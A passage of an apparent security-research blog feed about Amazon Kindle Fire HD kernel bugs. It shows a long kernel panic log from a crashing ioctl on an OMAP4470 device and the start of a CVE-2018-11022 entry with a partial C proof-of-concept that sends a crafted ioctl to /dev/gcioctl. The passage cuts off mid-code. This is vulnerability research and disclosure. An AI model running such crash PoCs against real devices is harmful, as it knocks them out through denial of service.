<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[  146.290710] Unable to handle kernel paging request at virtual address b5d18de6</span><br><span class="line">[  146.299438] pgd &#x3D; d72dc000</span><br><span class="line">[  146.302795] [b5d18de6] *pgd&#x3D;00000000</span><br><span class="line">[  146.307281] Internal error: Oops: 5 [#1] PREEMPT SMP ARM</span><br><span class="line">[  146.313232] Modules linked in: omaplfb(O) pvrsrvkm(O) pvr_logger(O)</span><br><span class="line">[  146.320983] CPU: 0    Tainted: G           O  (3.4.83-gd2afc0bae69 #1)</span><br><span class="line">[  146.328308] PC is at ion_free+0xc&#x2F;0xb4</span><br><span class="line">[  146.332672] LR is at rpmsg_omx_ioctl+0x2cc&#x2F;0x598</span><br><span class="line">[  146.337890] pc : [&lt;c02e8540&gt;]    lr : [&lt;c048a120&gt;]    psr: 60000013</span><br><span class="line">[  146.337890] sp : c35b5e60  ip : c35b5e80  fp : c35b5e7c</span><br><span class="line">[  146.350860] r10: c35b5ea8  r9 : de88c4d8  r8 : c35b4000</span><br><span class="line">[  146.356872] r7 : dd32b580  r6 : 00000003  r5 : d71d5880  r4 : be92f5f8</span><br><span class="line">[  146.364135] r3 : d71d58ec  r2 : d71d58ec  r1 : b5d18de2  r0 : d7aaaa00</span><br><span class="line">[  146.371551] Flags: nZCv  IRQs on  FIQs on  Mode SVC_32  ISA ARM  Segment user</span><br><span class="line">[  146.379516] Control: 10c5387d  Table: 972dc04a  DAC: 00000015</span><br><span class="line">[  146.386077] </span><br><span class="line">[  146.386077] PC: 0xc02e84c0:</span><br><span class="line">[  146.391052] 84c0  0a000001 e2871010 ebfddc25 e1a00006 eb0ee904 e5953058 e2433001 e5853058</span><br><span class="line">[  146.401580] 84e0  e3530000 ba000011 1a000009 e1a0200d e3c23d7f e3c3303f e285005c e593300c</span><br><span class="line">[  146.412292] 8500  e593723c e1a01007 ebf90a76 e597321c e585306c e1a00006 eb0ee876 e1a00005</span><br><span class="line">[  146.422821] 8520  ebffffb4 e1a00004 ebf8e011 e89da8f0 e7f001f2 e1a0c00d e92dd878 e24cb004</span><br><span class="line">[  146.433502] 8540  e5915004 e1a04001 e1550000 1a000021 e2856014 e1a00006 eb0ee8e2 e5953010</span><br><span class="line">[  146.444183] 8560  e3530000 0a000005 e243200c e1540002 2a00000a e5933008 e3530000 1afffff9</span><br><span class="line">[  146.454864] 8580  e59f0054 e3001219 e59f2050 e59f3050 ebf58268 e1a00006 eb0ee856 e89da878</span><br><span class="line">[  146.465393] 85a0  85933004 8affffed f57ff05f e1943f9f e2433001 e1842f93 e3320000 1afffffa</span><br><span class="line">[  146.476074] </span><br><span class="line">[  146.476074] LR: 0xc048a0a0:</span><br><span class="line">[  146.481048] a0a0  33a03000 e3530000 1affffae e24ba05c e1a01004 e3a02008 e1a0000a ebf7305e</span><br><span class="line">[  146.491729] a0c0  e3500000 1affffaa e5950068 e51b1058 ebf97677 e3500000 e50b005c 0a000001</span><br><span class="line">[  146.502380] a0e0  e3700a01 9affffc8 e3a03000 e50b305c eaffffc5 e3e00018 eaffff8e e1a00004</span><br><span class="line">[  146.513061] a100  e1a0100a e3a02008 ebf73154 e3500000 0affff88 eaffffc2 e5950068 ebf97904</span><br><span class="line">[  146.523590] a120  eaffffb9 e24b005c e3a01030 ebf7398b e3a02030 e597003c e1a03006 e58d2000</span><br><span class="line">[  146.534240] a140  e59f1280 e59f2274 ebf99069 e3e0000d eaffff78 e5933004 e7933101 e3530000</span><br><span class="line">[  146.544921] a160  0affff6c e5950068 ebf97651 e2509000 0a000021 e3790a01 8a00001f e5950068</span><br><span class="line">[  146.555603] a180  e1a01009 e24b2064 e24b3060 ebf97447 e3500000 050b905c 0affff9b e59f322c</span><br><span class="line">[  146.566131] </span><br><span class="line">[  146.566131] SP: 0xc35b5de0:</span><br><span class="line">[  146.571228] 5de0  00000004 d8cc50f4 60010013 00000001 00000001 c02e8540 60000013 ffffffff</span><br><span class="line">[  146.581787] 5e00  c35b5e4c c35b4000 c35b5e7c c35b5e18 c06a5318 c0008370 d7aaaa00 b5d18de2</span><br><span class="line">[  146.592437] 5e20  d71d58ec d71d58ec be92f5f8 d71d5880 00000003 dd32b580 c35b4000 de88c4d8</span><br><span class="line">[  146.603118] 5e40  c35b5ea8 c35b5e7c c35b5e80 c35b5e60 c048a120 c02e8540 60000013 ffffffff</span><br><span class="line">[  146.613830] 5e60  d71d58ec be92f5f8 d71d5880 00000003 c35b5f04 c35b5e80 c048a120 c02e8540</span><br><span class="line">[  146.624389] 5e80  c35b5edc c35b5e90 c0207454 c00bd920 0000001e d7333e40 c35b5ed4 c35b5ea8</span><br><span class="line">[  146.635070] 5ea0  c00723a0 000fffff b5d18de2 f6e48a17 00000002 00000001 00000000 c35b5f14</span><br><span class="line">[  146.645599] 5ec0  00000000 00000001 de88c4d8 c25d7c00 c35b5efc c35b5ee0 c02089fc 00000000</span><br><span class="line">[  146.656158] </span><br><span class="line">[  146.656158] IP: 0xc35b5e00:</span><br><span class="line">[  146.661254] 5e00  c35b5e4c c35b4000 c35b5e7c c35b5e18 c06a5318 c0008370 d7aaaa00 b5d18de2</span><br><span class="line">[  146.671936] 5e20  d71d58ec d71d58ec be92f5f8 d71d5880 00000003 dd32b580 c35b4000 de88c4d8</span><br><span class="line">[  146.682495] 5e40  c35b5ea8 c35b5e7c c35b5e80 c35b5e60 c048a120 c02e8540 60000013 ffffffff</span><br><span class="line">[  146.693176] 5e60  d71d58ec be92f5f8 d71d5880 00000003 c35b5f04 c35b5e80 c048a120 c02e8540</span><br><span class="line">[  146.703704] 5e80  c35b5edc c35b5e90 c0207454 c00bd920 0000001e d7333e40 c35b5ed4 c35b5ea8</span><br><span class="line">[  146.714263] 5ea0  c00723a0 000fffff b5d18de2 f6e48a17 00000002 00000001 00000000 c35b5f14</span><br><span class="line">[  146.724914] 5ec0  00000000 00000001 de88c4d8 c25d7c00 c35b5efc c35b5ee0 c02089fc 00000000</span><br><span class="line">[  146.735595] 5ee0  d72400c0 00000004 d72400c0 be92f5f8 de88c4d8 00000000 c35b5f74 c35b5f08</span><br><span class="line">[  146.746276] </span><br><span class="line">[  146.746276] FP: 0xc35b5dfc:</span><br><span class="line">[  146.751251] 5dfc  ffffffff c35b5e4c c35b4000 c35b5e7c c35b5e18 c06a5318 c0008370 d7aaaa00</span><br><span class="line">[  146.761779] 5e1c  b5d18de2 d71d58ec d71d58ec be92f5f8 d71d5880 00000003 dd32b580 c35b4000</span><br><span class="line">[  146.772308] 5e3c  de88c4d8 c35b5ea8 c35b5e7c c35b5e80 c35b5e60 c048a120 c02e8540 60000013</span><br><span class="line">[  146.783020] 5e5c  ffffffff d71d58ec be92f5f8 d71d5880 00000003 c35b5f04 c35b5e80 c048a120</span><br><span class="line">[  146.793701] 5e7c  c02e8540 c35b5edc c35b5e90 c0207454 c00bd920 0000001e d7333e40 c35b5ed4</span><br><span class="line">[  146.804382] 5e9c  c35b5ea8 c00723a0 000fffff b5d18de2 f6e48a17 00000002 00000001 00000000</span><br><span class="line">[  146.814941] 5ebc  c35b5f14 00000000 00000001 de88c4d8 c25d7c00 c35b5efc c35b5ee0 c02089fc</span><br><span class="line">[  146.825592] 5edc  00000000 d72400c0 00000004 d72400c0 be92f5f8 de88c4d8 00000000 c35b5f74</span><br><span class="line">[  146.836242] </span><br><span class="line">[  146.836242] R0: 0xd7aaa980:</span><br><span class="line">[  146.841217] a980  00000001 00000001 00000000 00000000 00004007 00000000 00000000 00000000</span><br><span class="line">[  146.851898] a9a0  00000020 00000000 00000000 00000000 00000300 d7aaa9b4 d7aaa9b4 c0248d00</span><br><span class="line">[  146.862518] a9c0  00000093 00000093 0000005d 00000002 00000000 00000000 00000000 00000000</span><br><span class="line">[  146.873077] a9e0  00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000</span><br><span class="line">[  146.883728] aa00  d763b780 00000000 00000000 deabb480 00000000 00000001 00000000 00000000</span><br><span class="line">[  146.894409] aa20  d7aaaa20 d7aaaa20 00000000 00000105 c0903054 d7157440 00000f30 dcd4f220</span><br><span class="line">[  146.905090] aa40  00000093 00000003 00000017 00000000 00000000 00000000 00000000 00000000</span><br><span class="line">[  146.915618] aa60  00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000</span><br><span class="line">[  146.926300] </span><br><span class="line">[  146.926300] R2: 0xd71d586c:</span><br><span class="line">[  146.931274] 586c  00000000 00000000 00000000 00000000 00000000 dd32b5c8 dd32b5c8 dd32b580</span><br><span class="line">[  146.941955] 588c  d71d588c d71d588c 00000000 00000000 00000000 00000001 00000000 00000000</span><br><span class="line">[  146.952636] 58ac  d71d58ac d71d58ac 00000000 00000000 00000000 d71d58c0 d71d58c0 00000000</span><br><span class="line">[  146.963287] 58cc  00000000 00000000 d71d58d4 d71d58d4 d7aaadc0 00000000 00000000 d7aaaa00</span><br><span class="line">[  146.973815] 58ec  d71d58ec d71d58ec 00000000 00000000 00000000 00006a44 d71d5904 d71d5904</span><br><span class="line">[  146.984497] 590c  00000003 d7138510 d725b910 00000000 00000000 d6cf989c 00000001 00000000</span><br><span class="line">[  146.995147] 592c  00000000 6149b660 6149b640 00001fe5 d71d593c d71d593c 00000000 00000000</span><br><span class="line">[  147.005676] 594c  00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000</span><br><span class="line">[  147.016357] </span><br><span class="line">[  147.016357] R3: 0xd71d586c:</span><br><span class="line">[  147.021453] 586c  00000000 00000000 00000000 00000000 00000000 dd32b5c8 dd32b5c8 dd32b580</span><br><span class="line">[  147.032012] 588c  d71d588c d71d588c 00000000 00000000 00000000 00000001 00000000 00000000</span><br><span class="line">[  147.042663] 58ac  d71d58ac d71d58ac 00000000 00000000 00000000 d71d58c0 d71d58c0 00000000</span><br><span class="line">[  147.053314] 58cc  00000000 00000000 d71d58d4 d71d58d4 d7aaadc0 00000000 00000000 d7aaaa00</span><br><span class="line">[  147.063873] 58ec  d71d58ec d71d58ec 00000000 00000000 00000000 00006a44 d71d5904 d71d5904</span><br><span class="line">[  147.074523] 590c  00000003 d7138510 d725b910 00000000 00000000 d6cf989c 00000001 00000000</span><br><span class="line">[  147.085205] 592c  00000000 6149b660 6149b640 00001fe5 d71d593c d71d593c 00000000 00000000</span><br><span class="line">[  147.095886] 594c  00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000</span><br><span class="line">[  147.106414] </span><br><span class="line">[  147.106445] R5: 0xd71d5800:</span><br><span class="line">[  147.111541] 5800  d71d5d00 00000000 00000000 dcfc4200 f0000009 00000211 00000001 00000001</span><br><span class="line">[  147.122070] 5820  00000000 00001000 00001000 00000004 00000000 d71d5844 c01519dc d89b54c0</span><br><span class="line">[  147.132751] 5840  c01576ac c10dc870 00001000 00000000 c0a10230 c0a10dc0 d1a1dd58 c006f724</span><br><span class="line">[  147.143432] 5860  00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000</span><br><span class="line">[  147.154083] 5880  dd32b5c8 dd32b5c8 dd32b580 d71d588c d71d588c 00000000 00000000 00000000</span><br><span class="line">[  147.164611] 58a0  00000001 00000000 00000000 d71d58ac d71d58ac 00000000 00000000 00000000</span><br><span class="line">[  147.175140] 58c0  d71d58c0 d71d58c0 00000000 00000000 00000000 d71d58d4 d71d58d4 d7aaadc0</span><br><span class="line">[  147.185821] 58e0  00000000 00000000 d7aaaa00 d71d58ec d71d58ec 00000000 00000000 00000000</span><br><span class="line">[  147.196472] </span><br><span class="line">[  147.196502] R7: 0xdd32b500:</span><br><span class="line">[  147.201446] b500  e2401000 f400f000 0202420f 0000c000 f400f000 dd071d20 00000000 d8f0a680</span><br><span class="line">[  147.212127] b520  d8f0a740 00000000 00000000 00000001 00000000 00000000 00000000 00000000</span><br><span class="line">[  147.222656] b540  00000000 00000000 00000001 00000000 00000000 00000000 00000000 00000000</span><br><span class="line">[  147.233184] b560  00000000 00000000 c153f430 00001000 00000000 00000000 00000000 00000000</span><br><span class="line">[  147.243865] b580  00000000 dd32b584 dd32b584 00000000 00000000 c0a16c60 00000000 00000002</span><br><span class="line">[  147.254547] b5a0  00000001 00000000 c06faab0 de88c61c de88c61c 0f700001 00000001 d8caa000</span><br><span class="line">[  147.265075] b5c0  dd0f7200 00000001 d71d5880 d71d5880 00000001 00000000 00000000 dd32b5dc</span><br><span class="line">[  147.275756] b5e0  dd32b5dc 00000000 7fffffff 00000000 00000000 dd32b5f4 dd32b5f4 00000000</span><br><span class="line">[  147.286407] </span><br><span class="line">[  147.286407] R8: 0xc35b3f80:</span><br><span class="line">[  147.291381] 3f80  66eff968 00000000 000000f0 c0013e08 c35b2000 00000000 00000000 c35b3fa8</span><br><span class="line">[  147.302032] 3fa0  c0013c60 c009a164 66eff978 66eff968 66eff978 00000080 00000000 00000000</span><br><span class="line">[  147.312713] 3fc0  66eff978 66eff968 00000000 000000f0 00000000 00000000 00000000 41d1f6a8</span><br><span class="line">[  147.323272] 3fe0  00000000 6716ebc8 400710f8 40083b80 600f0010 66eff978 00760061 00000061</span><br><span class="line">[  147.333923] 4000  00000000 00000002 00000000 d7157440 c0a0e840 00000000 00000015 d726ee00</span><br><span class="line">[  147.344604] 4020  d8d2c700 c35b4000 c09ddc50 d7157440 d8db57c0 c1617b40 c35b5b4c c35b5a98</span><br><span class="line">[  147.355133] 4040  c06a36e4 00000000 00000000 00000000 00000000 00000000 01000000 00000000</span><br><span class="line">[  147.365814] 4060  0087d4c0 5ebfe27f 00000000 00000000 00000000 00000000 00000000 00000000</span><br><span class="line">[  147.376464] </span><br><span class="line">[  147.376495] R9: 0xde88c458:</span><br><span class="line">[  147.381469] c458  de88c458 de88c458 00000000 00000000 00000000 c06bc674 000200da c09dda58</span><br><span class="line">[  147.392150] c478  00000000 00000000 de88c480 de88c480 00000000 de88c48c de88c48c 00000000</span><br><span class="line">[  147.402801] c498  5aefcde6 00000000 00000000 00000000 de88c4b0 28cfd730 00000000 00000000</span><br><span class="line">[  147.413330] c4b8  00200000 00000000 00000000 de88c4c4 de88c4c4 d8cbdf00 d8cbdf00 00000000</span><br><span class="line">[  147.424011] c4d8  000521b0 00000402 00000402 00000000 00000000 00000000 c06b9600 dd160400</span><br><span class="line">[  147.434661] c4f8  de88c5b0 d8c81030 00000f98 00000001 0f700001 5aefcde6 199c82ca 5aefcde6</span><br><span class="line">[  147.445312] c518  199c82ca 5aefcde6 199c82ca 00000000 00000000 00000000 00000000 00000000</span><br><span class="line">[  147.455871] c538  00000000 00000000 00000000 00000000 00000001 00000000 00000000 de88c554</span><br><span class="line">[  147.466522] </span><br><span class="line">[  147.466522] R10: 0xc35b5e28:</span><br><span class="line">[  147.471588] 5e28  be92f5f8 d71d5880 00000003 dd32b580 c35b4000 de88c4d8 c35b5ea8 c35b5e7c</span><br><span class="line">[  147.482269] 5e48  c35b5e80 c35b5e60 c048a120 c02e8540 60000013 ffffffff d71d58ec be92f5f8</span><br><span class="line">[  147.492950] 5e68  d71d5880 00000003 c35b5f04 c35b5e80 c048a120 c02e8540 c35b5edc c35b5e90</span><br><span class="line">[  147.503631] 5e88  c0207454 c00bd920 0000001e d7333e40 c35b5ed4 c35b5ea8 c00723a0 000fffff</span><br><span class="line">[  147.514160] 5ea8  b5d18de2 f6e48a17 00000002 00000001 00000000 c35b5f14 00000000 00000001</span><br><span class="line">[  147.524688] 5ec8  de88c4d8 c25d7c00 c35b5efc c35b5ee0 c02089fc 00000000 d72400c0 00000004</span><br><span class="line">[  147.535339] 5ee8  d72400c0 be92f5f8 de88c4d8 00000000 c35b5f74 c35b5f08 c0136044 c0489e60</span><br><span class="line">[  147.546020] 5f08  00000000 00000000 00000000 00000001 00000000 dd055190 dd5e7f68 c35b5f0c</span><br><span class="line">[  147.556579] Process rpmsg_omx_ioctl (pid: 3888, stack limit &#x3D; 0xc35b42f8)</span><br><span class="line">[  147.564270] Stack: (0xc35b5e60 to 0xc35b6000)</span><br><span class="line">[  147.569213] 5e60: d71d58ec be92f5f8 d71d5880 00000003 c35b5f04 c35b5e80 c048a120 c02e8540</span><br><span class="line">[  147.578430] 5e80: c35b5edc c35b5e90 c0207454 c00bd920 0000001e d7333e40 c35b5ed4 c35b5ea8</span><br><span class="line">[  147.587646] 5ea0: c00723a0 000fffff b5d18de2 f6e48a17 00000002 00000001 00000000 c35b5f14</span><br><span class="line">[  147.596740] 5ec0: 00000000 00000001 de88c4d8 c25d7c00 c35b5efc c35b5ee0 c02089fc 00000000</span><br><span class="line">[  147.605957] 5ee0: d72400c0 00000004 d72400c0 be92f5f8 de88c4d8 00000000 c35b5f74 c35b5f08</span><br><span class="line">[  147.615173] 5f00: c0136044 c0489e60 00000000 00000000 00000000 00000001 00000000 dd055190</span><br><span class="line">[  147.624389] 5f20: dd5e7f68 c35b5f0c c35b4000 be92f628 be92f5f8 c0085803 d72400c0 00000004</span><br><span class="line">[  147.633483] 5f40: c35b4000 00000000 c35b5f64 00000000 be92f5f8 c0085803 d72400c0 00000004</span><br><span class="line">[  147.642730] 5f60: c35b4000 00000000 c35b5fa4 c35b5f78 c01365e0 c0135fc4 00000000 00000000</span><br><span class="line">[  147.651947] 5f80: 00000400 be92f628 00010e54 00000000 00000036 c0013e08 00000000 c35b5fa8</span><br><span class="line">[  147.661010] 5fa0: c0013c60 c0136578 be92f628 00010e54 00000004 c0085803 be92f5f8 be92f5f8</span><br><span class="line">[  147.670104] 5fc0: be92f628 00010e54 00000000 00000036 00000000 00000000 00000000 be92f614</span><br><span class="line">[  147.679321] 5fe0: 00000000 be92f5dc 00010690 0002917c 60000010 00000004 00000017 579e6e78</span><br><span class="line">[  147.688537] Backtrace: </span><br><span class="line">[  147.691558] [&lt;c02e8534&gt;] (ion_free+0x0&#x2F;0xb4) from [&lt;c048a120&gt;] (rpmsg_omx_ioctl+0x2cc&#x2F;0x598)</span><br><span class="line">[  147.701049]  r6:00000003 r5:d71d5880 r4:be92f5f8 r3:d71d58ec</span><br><span class="line">[  147.708068] [&lt;c0489e54&gt;] (rpmsg_omx_ioctl+0x0&#x2F;0x598) from [&lt;c0136044&gt;] (do_vfs_ioctl+0x8c&#x2F;0x5b4)</span><br><span class="line">[  147.717956] [&lt;c0135fb8&gt;] (do_vfs_ioctl+0x0&#x2F;0x5b4) from [&lt;c01365e0&gt;] (sys_ioctl+0x74&#x2F;0x84)</span><br><span class="line">[  147.727203] [&lt;c013656c&gt;] (sys_ioctl+0x0&#x2F;0x84) from [&lt;c0013c60&gt;] (ret_fast_syscall+0x0&#x2F;0x30)</span><br><span class="line">[  147.736450]  r8:c0013e08 r7:00000036 r6:00000000 r5:00010e54 r4:be92f628</span><br><span class="line">[  147.744873] Code: e7f001f2 e1a0c00d e92dd878 e24cb004 (e5915004) </span><br><span class="line">[  147.754913] Board Information: </span><br><span class="line">[  147.754913]  Revision : 0001</span><br><span class="line">[  147.754943]  Serial	: 0000000000000000</span><br><span class="line">[  147.754943] SoC Information:</span><br><span class="line">[  147.754943]  CPU	: OMAP4470</span><br><span class="line">[  147.754943]  Rev	: ES1.0</span><br><span class="line">[  147.754974]  Type	: HS</span><br><span class="line">[  147.754974]  Production ID: 0002B975-000000CC</span><br><span class="line">[  147.754974]  Die ID	: 1CC60000-50002FFF-0B00935D-11007004</span><br><span class="line">[  147.755004] </span><br><span class="line">[  147.794616] ---[ end trace 50912198cfc81720 ]---</span><br><span class="line">[  147.799957] Kernel panic - not syncing: Fatal exception</span><br><span class="line">[  147.805847] CPU0: stopping</span><br><span class="line">[  147.808959] Backtrace: </span><br><span class="line">[  147.812133] [&lt;c0018148&gt;] (dump_backtrace+0x0&#x2F;0x10c) from [&lt;c0698bb8&gt;] (dump_stack+0x18&#x2F;0x1c)</span><br><span class="line">[  147.821502]  r6:c09ddc50 r5:c09dc844 r4:00000000 r3:c0a0e950</span><br><span class="line">[  147.828643] [&lt;c0698ba0&gt;] (dump_stack+0x0&#x2F;0x1c) from [&lt;c0019bd8&gt;] (handle_IPI+0x190&#x2F;0x1c4)</span><br><span class="line">[  147.837860] [&lt;c0019a48&gt;] (handle_IPI+0x0&#x2F;0x1c4) from [&lt;c00084fc&gt;] (gic_handle_irq+0x58&#x2F;0x60)</span><br><span class="line">[  147.847259] [&lt;c00084a4&gt;] (gic_handle_irq+0x0&#x2F;0x60) from [&lt;c06a5380&gt;] (__irq_svc+0x40&#x2F;0x70)</span><br><span class="line">[  147.856567] Exception stack(0xdd187b38 to 0xdd187b80)</span><br><span class="line">[  147.862243] 7b20:                                                       00000002 00000002</span><br><span class="line">[  147.871459] 7b40: 00000002 00000001 dd187bbc c1621100 c1621100 00c6a000 c1621108 00000001</span><br><span class="line">[  147.880676] 7b60: 00000001 dd187bac 00000002 dd187b80 c002398c c009ae48 200d0013 ffffffff</span><br><span class="line">[  147.889892]  r6:ffffffff r5:200d0013 r4:c009ae48 r3:c002398c</span><br><span class="line">[  147.896911] [&lt;c009add0&gt;] (generic_exec_single+0x0&#x2F;0x98) from [&lt;c009af78&gt;] (smp_call_function_single+0x110&#x2F;0x1e0)</span><br><span class="line">[  147.908325] [&lt;c009ae68&gt;] (smp_call_function_single+0x0&#x2F;0x1e0) from [&lt;c009b28c&gt;] (smp_call_function_many+0x244&#x2F;0x294)</span><br><span class="line">[  147.920104] [&lt;c009b048&gt;] (smp_call_function_many+0x0&#x2F;0x294) from [&lt;c009b48c&gt;] (smp_call_function+0x48&#x2F;0x74)</span><br><span class="line">[  147.931030] [&lt;c009b444&gt;] (smp_call_function+0x0&#x2F;0x74) from [&lt;c04310f4&gt;] (cpuidle_latency_notify+0x20&#x2F;0x28)</span><br><span class="line">[  147.941864]  r4:ffffffff r3:c04310d4</span><br><span class="line">[  147.946258] [&lt;c04310d4&gt;] (cpuidle_latency_notify+0x0&#x2F;0x28) from [&lt;c06a7154&gt;] (notifier_call_chain+0x4c&#x2F;0x8c)</span><br><span class="line">[  147.957305] [&lt;c06a7108&gt;] (notifier_call_chain+0x0&#x2F;0x8c) from [&lt;c006ebc0&gt;] (__blocking_notifier_call_chain+0x50&#x2F;0x68)</span><br><span class="line">[  147.969085]  r8:200d0013 r7:000000a0 r6:00000000 r5:ffffffff r4:c0a11df8</span><br><span class="line">[  147.977020] r3:ffffffff</span><br><span class="line">[  147.980499] [&lt;c006eb70&gt;] (__blocking_notifier_call_chain+0x0&#x2F;0x68) from [&lt;c006ebf8&gt;] (blocking_notifier_call_chain+0x20&#x2F;0x28)</span><br><span class="line">[  147.993133]  r7:de95183c r6:000000a0 r5:0000115c r4:c0a11d98</span><br><span class="line">[  148.000152] [&lt;c006ebd8&gt;] (blocking_notifier_call_chain+0x0&#x2F;0x28) from [&lt;c0088eec&gt;] (pm_qos_update_target+0xf8&#x2F;0x19c)</span><br><span class="line">[  148.011932] [&lt;c0088df4&gt;] (pm_qos_update_target+0x0&#x2F;0x19c) from [&lt;c008909c&gt;] (pm_qos_update_request+0x5c&#x2F;0x8c)</span><br><span class="line">[  148.023071] [&lt;c0089040&gt;] (pm_qos_update_request+0x0&#x2F;0x8c) from [&lt;c0411b18&gt;] (omap_i2c_xfer+0x2bc&#x2F;0x6c8)</span><br><span class="line">[  148.033599]  r5:dd187da0 r4:00000000</span><br><span class="line">[  148.038024] [&lt;c041185c&gt;] (omap_i2c_xfer+0x0&#x2F;0x6c8) from [&lt;c040e5cc&gt;] (i2c_transfer+0xb8&#x2F;0xf8)</span><br><span class="line">[  148.047637] [&lt;c040e514&gt;] (i2c_transfer+0x0&#x2F;0xf8) from [&lt;c040e930&gt;] (i2c_smbus_xfer+0x278&#x2F;0x588)</span><br><span class="line">[  148.057434] [&lt;c040e6b8&gt;] (i2c_smbus_xfer+0x0&#x2F;0x588) from [&lt;c040eedc&gt;] (i2c_smbus_read_word_data+0x3c&#x2F;0x4c)</span><br><span class="line">[  148.068267] [&lt;c040eea0&gt;] (i2c_smbus_read_word_data+0x0&#x2F;0x4c) from [&lt;c0418760&gt;] (bq27541_i2c_read.constprop.7+0x20&#x2F;0x54)</span><br><span class="line">[  148.080200] [&lt;c0418740&gt;] (bq27541_i2c_read.constprop.7+0x0&#x2F;0x54) from [&lt;c04189f0&gt;] (battery_handle_work+0x120&#x2F;0x6a4)</span><br><span class="line">[  148.091857]  r5:dd187e92 r4:dd08b920</span><br><span class="line">[  148.096374] [&lt;c04188d0&gt;] (battery_handle_work+0x0&#x2F;0x6a4) from [&lt;c0063278&gt;] (process_one_work+0x150&#x2F;0x468)</span><br><span class="line">[  148.107116] [&lt;c0063128&gt;] (process_one_work+0x0&#x2F;0x468) from [&lt;c00638c4&gt;] (worker_thread+0x13c&#x2F;0x320)</span><br><span class="line">[  148.117156] [&lt;c0063788&gt;] (worker_thread+0x0&#x2F;0x320) from [&lt;c0068af4&gt;] (kthread+0x90&#x2F;0x9c)</span><br><span class="line">[  148.126312] [&lt;c0068a64&gt;] (kthread+0x0&#x2F;0x9c) from [&lt;c004cd64&gt;] (do_exit+0x0&#x2F;0x7e0)</span><br><span class="line">[  148.134765]  r6:c004cd64 r5:c0068a64 r4:dd0aded4</span><br><span class="line">[  148.140533] CPU0 PC (0) : 0xc0019b2c</span><br><span class="line">[  148.144714] CPU0 PC (1) : 0xc0019b2c</span><br><span class="line">[  148.148773] CPU0 PC (2) : 0xc0019b2c</span><br><span class="line">[  148.152832] CPU0 PC (3) : 0xc0019b2c</span><br><span class="line">[  148.156890] CPU0 PC (4) : 0xc0019b2c</span><br><span class="line">[  148.161071] CPU0 PC (5) : 0xc0019b2c</span><br><span class="line">[  148.165130] CPU0 PC (6) : 0xc0019b2c</span><br><span class="line">[  148.169189] CPU0 PC (7) : 0xc0019b2c</span><br><span class="line">[  148.173370] CPU0 PC (8) : 0xc0019b2c</span><br><span class="line">[  148.177429] CPU0 PC (9) : 0xc0019b2c</span><br><span class="line">[  148.181488] CPU1 PC (0) : 0xc003ee38</span><br><span class="line">[  148.185668] CPU1 PC (1) : 0xc003ee54</span><br><span class="line">[  148.189727] CPU1 PC (2) : 0xc003ee54</span><br><span class="line">[  148.193786] CPU1 PC (3) : 0xc003ee54</span><br><span class="line">[  148.197967] CPU1 PC (4) : 0xc003ee54</span><br><span class="line">[  148.202026] CPU1 PC (5) : 0xc003ee54</span><br><span class="line">[  148.206085] CPU1 PC (6) : 0xc003ee54</span><br><span class="line">[  148.210266] CPU1 PC (7) : 0xc003ee54</span><br><span class="line">[  148.214324] CPU1 PC (8) : 0xc003ee54</span><br><span class="line">[  148.218383] CPU1 PC (9) : 0xc003ee54</span><br><span class="line">[  148.222442] </span><br><span class="line">[  148.224365] Restarting Linux version 3.4.83-gd2afc0bae69 (build@14-use1a-b-39) (gcc version 4.7 (GCC) ) #1 SMP PREEMPT Tue Sep 19 22:04:47 UTC 2017</span><br><span class="line">[  148.224365] </span><br></pre></td></tr></table></figure>
</blockquote>
]]></content>
      <categories>
        <category>IOT</category>
      </categories>
      <tags>
        <tag>IOT</tag>
        <tag>Amazon</tag>
      </tags>
  </entry>
  <entry>
    <title>（CVE-2018-11022）Amazon Kindle Fire HD (3rd) Fire OS kernel组件安全漏洞</title>
    <url>/2020/09/12/IOT/Exploit/Amazon%20Kindle%20Fire%20HD(3rd)/%EF%BC%88CVE-2018-11022%EF%BC%89Amazon-Kindle-Fire-HD-3rd-Fire-OS-kernel%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><blockquote>
<p>mazon Kindle Fire HD（3rd）Fire OS 4.5.5.3的内核组件中的内核模块/omap/drivers/misc/gcx/gcioctl/gcif.c允许攻击者通过设备/ dev上ioctl的参数注入特制参数/ gcioctl使用命令<strong>3224132973，</strong>并导致内核崩溃。</p>
</blockquote>
<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Fire OS 4.5.5.3</p>
<a id="more"></a>

<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>poc</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * This is poc of Kindle Fire HD 3rd</span></span><br><span class="line"><span class="comment"> * A bug in the ioctl interface of device file /dev/gcioctl causes the system crash via IOCTL 3224132973.</span></span><br><span class="line"><span class="comment"> * Related buggy struct name is gcicommit.</span></span><br><span class="line"><span class="comment"> * This Poc should run with permission to do ioctl on /dev/gcioctl.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * The fowllwing is kmsg of kernel crash infomation:</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">static</span> <span class="keyword">char</span> *driver = <span class="string">&quot;/dev/gcioctl&quot;</span>;</span><br><span class="line"><span class="keyword">static</span> command = <span class="number">3224132973</span>; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv, <span 